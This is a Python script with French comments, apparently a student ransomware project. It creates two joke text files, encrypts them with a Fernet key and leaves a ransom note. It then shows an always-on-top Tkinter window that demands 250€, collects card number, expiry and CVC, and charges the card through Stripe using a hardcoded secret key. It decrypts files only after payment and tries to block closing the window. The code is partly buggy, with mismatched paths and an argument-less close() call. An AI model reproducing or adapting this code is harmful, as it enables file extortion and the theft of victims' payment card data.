# Création des fichiers de l'utilisateur que nous
import os
def create_dir(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory

def write_file(path,data):
    file = open(path,'w')
    file.write(data)
    return file
def remplir_repertoire(dir):
    with open(str(dir)+'/'+'quoicoubeh.txt','w') as file :
        file.write("Pourquoi les crampté ne jouent-ils jamais avec les quoicoubeh ?")
        file.write("Parce qu'ils finissent toujours par se prendre les pieds dans les tentacules des quoicoubeh !")
    with open(str(dir)+'/'+'LaBlagueDuPlongeur.txt','w') as file :
        file.write("Pourquoi est-ce que les plongeurs plongent toujours en arrière et jamais en avant ?")
        file.write("Parce que sinon, ils tombent dans le bateau !")
pwd=create_dir('files')
remplir_repertoire(pwd)

# Chiffrement des fichiers de l'utilisateur
from cryptography.fernet import Fernet
items=os.listdir(pwd)
def generation_clef():
    clef=Fernet.generate_key()
    with open ("clef.key",'wb') as key_file:
        key_file.write(clef)
def lire_clef():
    return open('clef.key','rb').read()
def chiffrement(items,clef):
    f=Fernet(clef)
    for item in items :
        with open(item,'rb') as File:
            file_data=File.read()
        encrypted_data=f.encrypt(file_data)
        with open(item,'wb') as File:
            File.write(encrypted_data)
path=[str(pwd) + '/' + item for item in items]
generation_clef()
clef=lire_clef()
chiffrement(path,clef)
with open(str(pwd) + '/' + 'readme.txt','w') as file :
    file.write('PAYEEE !!! Donne mon argent !!!')

# Affichage de l'app
import tkinter as tk
from tkinter import *
import tkinter.font as tkFont

class App:
    def __init__(self, root):
        #Titre
        root.title("PTR")
        #Taille de la fenêtre de l'application
        width=400
        height=600
        screenwidth = root.winfo_screenwidth()
        screenheight = root.winfo_screenheight()
        alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
        root.geometry(alignstr)
        root.resizable(width=False, height=False)
        root.wm_attributes("-topmost", 1)

        import sys
        sys.path.append('data')

        # Système de paiement
        import stripe

        stripe.api_key = 'sk_test_51MP4JIDouJcaqTebvs7JBZQetAWVyGdP1vJUQZSbQpAhXFnnYMLDgnNWobC82UW6eluRtVpoWUek1pqfjShSSgQo00xtqqT251'

        # Création du titre
        title_label = tk.Label(root, text="§\ PAS DE CHANCE /§", font=("Arial", 20))
        title_label.pack(pady=20)

        # Création du paragraphe
        text_label = tk.Label(root, text="Vous venez de vous faire harponner par un malware. Vos documents ont été cryptés et sont maintenant inutilisable, le seul moyen de pouvoir de nouveau les utiliser et des payer la modique somme de 250€ La prochaine fois, vous ferez plus attention en vous baladant sur le net.", font=("Arial", 12), wraplength=300, justify="center")
        text_label.pack(padx=30, pady=30)

        # Création des éléments d'interface utilisateur Tkinter
        tk.Label(root, text="Numéro de carte").place(relx=0.5, rely=0.56, anchor=CENTER)
        card_number = tk.Entry(root)
        card_number.place(relx=0.5, rely=0.59, anchor=CENTER)

        tk.Label(root, text="Date d'expiration (MM/AA)").place(relx=0.5, rely=0.64, anchor=CENTER)
        expiration_date = tk.Entry(root)
        expiration_date.place(relx=0.5, rely=0.67, anchor=CENTER)

        tk.Label(root, text="Code de sécurité").place(relx=0.5, rely=0.72, anchor=CENTER)
        cvc = tk.Entry(root)
        cvc.place(relx=0.5, rely=0.75, anchor=CENTER)

        

        def process_payment():
            # Récupération des informations de paiement saisies par l'utilisateur
            card_num = card_number.get()
            exp_date = expiration_date.get()
            cvc_code = cvc.get()

            # Création d'un token de test à partir des informations de paiement
            token = stripe.Token.create(
                card={
                    "number": card_num,
                    "exp_month": exp_date.split('/')[0],
                    "exp_year": exp_date.split('/')[1],
                    "cvc": cvc_code
                }
            )

            # Utilisation du token de test pour créer une charge
            charge = stripe.Charge.create(
                amount=25000,
                currency='eur',
                source=token['id'],
                description='Paiement en ligne'
            )

            # Affichage de la réponse de Stripe dans la console
            print(charge["status"])
            if charge["status"] == "succeeded":

                # Fonction de décryptage des fichiers en utilisant la clé
                def decrypt(items, clef):
                    f=Fernet(clef)
                    for item in items:
                        with open(item,'rb') as File:
                            file_data=File.read()
                        decrypted_data=f.decrypt(file_data)
                        with open(item,'wb') as File:
                            File.write(decrypted_data)
                def lire_clef():
                    return open('clef.key','rb').read()
                clef=lire_clef()

                # Suppression de la clé et du readme + décryptage
                path="C:/Program Files (x86)/Photoshop/files"
                os.remove(path + '/' + 'readme.txt')
                items=os.listdir(path)
                chemin=[path + '/' + item for item in items]
                decrypt(chemin,clef)
                path="C:/Program Files (x86)/Photoshop"
                os.remove(path + '/' + 'clef.key')

                # Fermeture le l'app
                root.destroy()
                


        # Création du bouton de paiement
        tk.Button(root, text="Payer", command=process_payment).place(relx=0.5, rely=0.82, anchor=CENTER)

        #Cache la barre d'aplication windows
        root.overrideredirect(True)

        #Empèche alt + F4
        pressed_f4 = False

        def do_exit():
            global pressed_f4
            print('Trying to close application')
            if pressed_f4:
                print('Denied!')
                pressed_f4 = False 
            else:
                close()  

        # Si l'utilisateur appuie sur Alt-F4
        def alt_f4(event):  
            global pressed_f4
            print('Alt-F4 pressed')
            pressed_f4 = True

        def close(event):
            root.destroy()

        root.bind('<Alt-F4>', alt_f4)
        root.bind('<Escape>', close)
        root.protocol("WM_DELETE_WINDOW",do_exit)

    def GButton_220_command(self):
        print("command")

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()